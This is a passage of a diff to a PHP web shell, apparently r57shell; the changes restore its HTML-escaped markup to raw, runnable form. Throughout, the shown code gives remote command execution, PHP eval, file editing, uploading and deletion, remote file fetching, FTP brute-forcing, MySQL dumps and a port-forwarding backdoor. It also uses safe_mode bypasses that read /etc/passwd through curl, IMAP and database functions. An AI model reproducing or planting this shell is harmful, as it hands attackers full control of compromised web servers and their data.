+       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
        $_POST['cmd']="";
        }
      break;
@@ -1771,12 +1771,12 @@ if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
       if(mkdir($_POST['mk_name']))
        {
          $_POST['cmd']="";
-         echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text62']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
        }
       else { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
       }
       else if($_POST['action'] == "delete"){
-      if(rmdir($_POST['mk_name'])) echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text64']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+      if(rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
      break;
@@ -1789,20 +1789,20 @@ if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name'
  else {
  echo $table_up3;
  echo $font;
- echo "&lt;form name=save_file method=post&gt;";
- echo ws(3)."&lt;b&gt;".$_POST['e_name']."&lt;/b&gt;";
- echo "&lt;div align=center&gt;&lt;textarea name=e_text cols=121 rows=24&gt;";
+ echo "<form name=save_file method=post>";
+ echo ws(3)."<b>".$_POST['e_name']."</b>";
+ echo "<div align=center><textarea name=e_text cols=121 rows=24>";
  echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
  fclose($file);
- echo "&lt;/textarea&gt;";
- echo "&lt;input type=hidden name=e_name value=".$_POST['e_name']."&gt;";
- echo "&lt;input type=hidden name=dir value=".$dir."&gt;";
- echo "&lt;input type=hidden name=cmd value=save_file&gt;";
- echo (!empty($only_read)?("&lt;br&gt;&lt;br&gt;".$lang[$language.'_text44']):("&lt;br&gt;&lt;br&gt;&lt;input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \"&gt;"));
- echo "&lt;/div&gt;";
- echo "&lt;/font&gt;";
- echo "&lt;/form&gt;";
- echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+ echo "</textarea>";
+ echo "<input type=hidden name=e_name value=".$_POST['e_name'].">";
+ echo "<input type=hidden name=dir value=".$dir.">";
+ echo "<input type=hidden name=cmd value=save_file>";
+ echo (!empty($only_read)?("<br><br>".$lang[$language.'_text44']):("<br><br><input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \">"));
+ echo "</div>";
+ echo "</font>";
+ echo "</form>";
+ echo "</td></tr></table>";
  exit();
  }
  }
@@ -1815,7 +1815,7 @@ if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
  @fwrite($file,$_POST['e_text']);
  @touch($_POST['e_name'],$mtime,$mtime);
  $_POST['cmd']="";
- echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text45']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+ echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
  }
  }
 if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
@@ -1866,14 +1866,14 @@ if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_PO
  $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
  $_POST['cmd']="ps -aux | grep dpc";
 }
-if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=&gt;$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=$alias_cmd;}}}
+if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=$alias_cmd;}}}
 if (!empty($HTTP_POST_FILES['userfile']['name']))
 {
 if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }
 else { $nfn = $HTTP_POST_FILES['userfile']['name']; }
 @copy($HTTP_POST_FILES['userfile']['tmp_name'],
             $_POST['dir']."/".$nfn)
-      or print("&lt;font color=orange face=Fixedsys&gt;&lt;div align=center&gt;Malesef gulum Buraya Y&#252;kleyemezsin ".$HTTP_POST_FILES['userfile']['name']."&lt;/div&gt;&lt;/font&gt;");
+      or print("<font color=orange face=Fixedsys><div align=center>Malesef gulum Buraya Y&#252;kleyemezsin ".$HTTP_POST_FILES['userfile']['name']."</div></font>");
 }
 if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
 {
@@ -1886,13 +1886,13 @@ if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_f
  $_POST['cmd'] = which('fetch')." -o ".$_POST['loc_file']." -p ".$_POST['rem_file']."";
  break;
  case lynx:
- $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." &gt; ".$_POST['loc_file']."";
+ $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
  break;
  case links:
- $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." &gt; ".$_POST['loc_file']."";
+ $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
  break;
  case GET:
- $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." &gt; ".$_POST['loc_file']."";
+ $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." > ".$_POST['loc_file']."";
  break;
  case curl:
  $_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
@@ -1923,13 +1923,13 @@ if(!empty($_POST['cmd']) && $_POST['cmd']=="ftp_brute")
  if(empty($ftp_port)) { $ftp_port = 21; }
  $connection = @ftp_connect ($ftp_server,$ftp_port,10);
  if(!$connection) { fe($language,0); $_POST['cmd'] = ""; }
- else if(!$users=get_users()) { echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$lang[$language.'_text96']."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"; $_POST['cmd'] = ""; }
+ else if(!$users=get_users()) { echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><font color=orange face=Verdana size=-2><div align=center><b>".$lang[$language.'_text96']."</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
  @ftp_close($connection);
  }
 echo $table_up3;
 if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?("dir"):("ls -lia"); }
 else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
-echo $font.$lang[$language.'_text1'].": &lt;b&gt;".$_POST['cmd']."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;div align=center&gt;&lt;textarea name=report cols=121 rows=15&gt;";
+echo $font.$lang[$language.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>";
 if($safe_mode)
 {
  switch($_POST['cmd'])
@@ -1938,14 +1938,14 @@ if($safe_mode)
   $d=@dir($dir);
   if ($d)
    {
-   while (false!==($file=$d-&gt;read()))
+   while (false!==($file=$d->read()))
     {
      if ($file=="." || $file=="..") continue;
      @clearstatcache();
      list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
      if($windows){
      echo date("d.m.Y H:i",$mtime);
-     if(@is_dir($file)) echo "  &lt;DIR&gt; "; else printf("% 7s ",$size);
+     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
      }
      else{
      $owner = @posix_getpwuid($uid);
@@ -1957,7 +1957,7 @@ if($safe_mode)
      }
      echo "$file\n";
     }
-   $d-&gt;close();
+   $d->close();
    }
   else echo $lang[$language._text29];
  break;
@@ -1968,7 +1968,7 @@ if($safe_mode)
    if($file)
     {
     $c = @sizeof($file);
-    for($i=0;$i&lt;$c;$i++) { echo htmlspecialchars($file[$i]); }
+    for($i=0;$i<$c;$i++) { echo htmlspecialchars($file[$i]); }
     }
    else echo $lang[$language._text29];
    }
@@ -2038,7 +2038,7 @@ if($safe_mode)
   case 'test6':
   $stream = @imap_open('/etc/passwd', "", "");
   $dir_list = @imap_list($stream, trim($_POST['test6_file']), "*");
-  for ($i = 0; $i &lt; count($dir_list); $i++) echo $dir_list[$i]."\r\n";
+  for ($i = 0; $i < count($dir_list); $i++) echo $dir_list[$i]."\r\n";
   @imap_close($stream);
   break;
   case 'test7':
@@ -2077,245 +2077,245 @@ if ($_POST['cmd']=="mysql_dump")
  {
   if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
   $sql = new my_sql();
-  $sql-&gt;db   = $_POST['db'];
-  $sql-&gt;host = $_POST['db_server'];
-  $sql-&gt;port = $_POST['db_port'];
-  $sql-&gt;user = $_POST['mysql_l'];
-  $sql-&gt;pass = $_POST['mysql_p'];
-  $sql-&gt;base = $_POST['mysql_db'];
-  if(!$sql-&gt;connect()) { echo "[-] ERROR! Can't connect to SQL server"; }
-  else if(!$sql-&gt;select_db()) { echo "[-] ERROR! Can't select database"; }
-  else if(!$sql-&gt;dump($_POST['mysql_tbl'])) { echo "[-] ERROR! Can't create dump"; }
+  $sql->db   = $_POST['db'];
+  $sql->host = $_POST['db_server'];
+  $sql->port = $_POST['db_port'];
+  $sql->user = $_POST['mysql_l'];
+  $sql->pass = $_POST['mysql_p'];
+  $sql->base = $_POST['mysql_db'];
+  if(!$sql->connect()) { echo "[-] ERROR! Can't connect to SQL server"; }
+  else if(!$sql->select_db()) { echo "[-] ERROR! Can't select database"; }
+  else if(!$sql->dump($_POST['mysql_tbl'])) { echo "[-] ERROR! Can't create dump"; }
   else {
-   if(empty($_POST['dif'])) { foreach($sql-&gt;dump as $v) echo $v."\r\n"; }
-   else if($fp){ foreach($sql-&gt;dump as $v) @fputs($fp,$v."\r\n"); }
+   if(empty($_POST['dif'])) { foreach($sql->dump as $v) echo $v."\r\n"; }
+   else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v."\r\n"); }
    else { echo "[-] ERROR! Can't write in dump file"; }
    }
  }
-echo "&lt;/textarea&gt;&lt;/div&gt;";
-echo "&lt;/b&gt;";
-echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
-echo "&lt;table width=100% cellpadding=0 cellspacing=0&gt;";
+echo "</textarea></div>";
+echo "</b>";
+echo "</td></tr></table>";
+echo "<table width=100% cellpadding=0 cellspacing=0>";
 function up_down($id)
  {
  global $lang;
  global $language;
- return '&nbsp&lt;img src='.$_SERVER['PHP_SELF'].'?img=1 onClick="document.getElementById(\''.$id.'\').style.display = \'none\'; document.cookie=\''.$id.'=0;\';" title="'.$lang[$language.'_text109'].'"&gt;&lt;img src='.$_SERVER['PHP_SELF'].'?img=2 onClick="document.getElementById(\''.$id.'\').style.display = \'block\'; document.cookie=\''.$id.'=1;\';" title="'.$lang[$language.'_text110'].'"&gt;';
+ return '&nbsp<img src='.$_SERVER['PHP_SELF'].'?img=1 onClick="document.getElementById(\''.$id.'\').style.display = \'none\'; document.cookie=\''.$id.'=0;\';" title="'.$lang[$language.'_text109'].'"><img src='.$_SERVER['PHP_SELF'].'?img=2 onClick="document.getElementById(\''.$id.'\').style.display = \'block\'; document.cookie=\''.$id.'=1;\';" title="'.$lang[$language.'_text110'].'">';
  }
 function div($id)
  {
- if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '&lt;div id="'.$id.'" style="display: none;"&gt;';
- return '&lt;div id="'.$id.'"&gt;';
+ if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '<div id="'.$id.'" style="display: none;">';
+ return '<div id="'.$id.'">';
  }
 if(!$safe_mode){
 echo $fs.$table_up1.$lang[$language.'_text2'].up_down('id1').$table_up2.div('id1').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text3'].$arrow."&lt;/b&gt;",in('text','cmd',85,''));
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text4'].$arrow."&lt;/b&gt;",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','cmd',85,''));
+echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 else{
 echo $fs.$table_up1.$lang[$language.'_text28'].up_down('id2').$table_up2.div('id2').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text4'].$arrow."&lt;/b&gt;",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 echo $fs.$table_up1.$lang[$language.'_text42'].up_down('id3').$table_up2.div('id3').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text43'].$arrow."&lt;/b&gt;",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
+echo $te.'</div>'.$table_end1.$fe;
 if($safe_mode){
 echo $fs.$table_up1.$lang[$language.'_text57'].up_down('id4').$table_up2.div('id4').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text58'].$arrow."&lt;/b&gt;",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."&lt;select name=action&gt;&lt;option value=create&gt;".$lang[$language.'_text65']."&lt;/option&gt;&lt;option value=delete&gt;".$lang[$language.'_text66']."&lt;/option&gt;&lt;/select&gt;".ws(3)."&lt;select name=what&gt;&lt;option value=file&gt;".$lang[$language.'_text59']."&lt;/option&gt;&lt;option value=dir&gt;".$lang[$language.'_text60']."&lt;/option&gt;&lt;/select&gt;".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text58'].$arrow."</b>",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."<select name=action><option value=create>".$lang[$language.'_text65']."</option><option value=delete>".$lang[$language.'_text66']."</option></select>".ws(3)."<select name=what><option value=file>".$lang[$language.'_text59']."</option><option value=dir>".$lang[$language.'_text60']."</option></select>".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if($safe_mode && $unix){
 echo $fs.$table_up1.$lang[$language.'_text67'].up_down('id5').$table_up2.div('id5').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text68'].$arrow."&lt;/b&gt;","&lt;select name=what&gt;&lt;option value=mod&gt;CHMOD&lt;/option&gt;&lt;option value=own&gt;CHOWN&lt;/option&gt;&lt;option value=grp&gt;CHGRP&lt;/option&gt;&lt;/select&gt;".ws(2)."&lt;b&gt;".$lang[$language.'_text69'].$arrow."&lt;/b&gt;".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."&lt;b&gt;".$lang[$language.'_text70'].$arrow."&lt;/b&gt;".ws(2).in('text','param2 title="'.$lang[$language.'_text71'].'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text68'].$arrow."</b>","<select name=what><option value=mod>CHMOD</option><option value=own>CHOWN</option><option value=grp>CHGRP</option></select>".ws(2)."<b>".$lang[$language.'_text69'].$arrow."</b>".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."<b>".$lang[$language.'_text70'].$arrow."</b>".ws(2).in('text','param2 title="'.$lang[$language.'_text71'].'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if(!$safe_mode){
-foreach ($aliases as $alias_name=&gt;$alias_cmd)
+foreach ($aliases as $alias_name=>$alias_cmd)
  {
- $aliases2 .= "&lt;option&gt;$alias_name&lt;/option&gt;";
+ $aliases2 .= "<option>$alias_name</option>";
  }
 echo $fs.$table_up1.$lang[$language.'_text7'].up_down('id6').$table_up2.div('id6').$ts;
-echo sr(15,"&lt;b&gt;".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."&lt;/b&gt;","&lt;select name=alias&gt;".$aliases2."&lt;/select&gt;".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."</b>","<select name=alias>".$aliases2."</select>".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 echo $fs.$table_up1.$lang[$language.'_text54'].up_down('id7').$table_up2.div('id7').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text52'].$arrow."&lt;/b&gt;",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text53'].$arrow."&lt;/b&gt;",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text55'].$arrow."&lt;/b&gt;",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text52'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
+echo sr(15,"<b>".$lang[$language.'_text53'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
+echo sr(15,"<b>".$lang[$language.'_text55'].$arrow."</b>",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
+echo $te.'</div>'.$table_end1.$fe;
 if(!$safe_mode && $unix){
 echo $fs.$table_up1.$lang[$language.'_text76'].up_down('id8').$table_up2.div('id8').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text72'].$arrow."&lt;/b&gt;",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text73'].$arrow."&lt;/b&gt;",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text74'].$arrow."&lt;/b&gt;",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text72'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
+echo sr(15,"<b>".$lang[$language.'_text73'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
+echo sr(15,"<b>".$lang[$language.'_text74'].$arrow."</b>",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
+echo $te.'</div>'.$table_end1.$fe;
 }
 echo $fs.$table_up1.$lang[$language.'_text32'].up_down('id9').$table_up2.$font;
-echo "&lt;div align=center&gt;".div('id9')."&lt;textarea name=php_eval cols=100 rows=3&gt;";
+echo "<div align=center>".div('id9')."<textarea name=php_eval cols=100 rows=3>";
 echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");"));
-echo "&lt;/textarea&gt;";
+echo "</textarea>";
 echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
-echo "&lt;br&gt;".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
-echo "&lt;/div&gt;&lt;/div&gt;&lt;/font&gt;";
+echo "<br>".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
+echo "</div></div></font>";
 echo $table_end1.$fe;
 if($safe_mode&&$curl_on)
 {
 echo $fs.$table_up1.$lang[$language.'_text33'].up_down('id10').$table_up2.div('id10').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if($safe_mode)
 {
 echo $fs.$table_up1.$lang[$language.'_text34'].up_down('id11').$table_up2.div('id11').$ts;
-echo "&lt;table class=table1 width=100% align=center&gt;";
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo "<table class=table1 width=100% align=center>";
+echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if($safe_mode&&$mysql_on)
 {
 echo $fs.$table_up1.$lang[$language.'_text35'].up_down('id12').$table_up2.div('id12').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text36'].$arrow."&lt;/b&gt;",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;".in('text','test3_port',15,(!empty($_POST['test3_port'])?($_POST['test3_port']):("3306"))));
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test3').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test3_port',15,(!empty($_POST['test3_port'])?($_POST['test3_port']):("3306"))));
+echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test3').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if($safe_mode&&$mssql_on)
 {
 echo $fs.$table_up1.$lang[$language.'_text85'].up_down('id13').$table_up2.div('id13').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text36'].$arrow."&lt;/b&gt;",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text3'].$arrow."&lt;/b&gt;",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
+echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if($safe_mode&&$unix&&function_exists('mb_send_mail')){
 echo $fs.$table_up1.$lang[$language.'_text112'].up_down('id22').$table_up2.div('id22').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
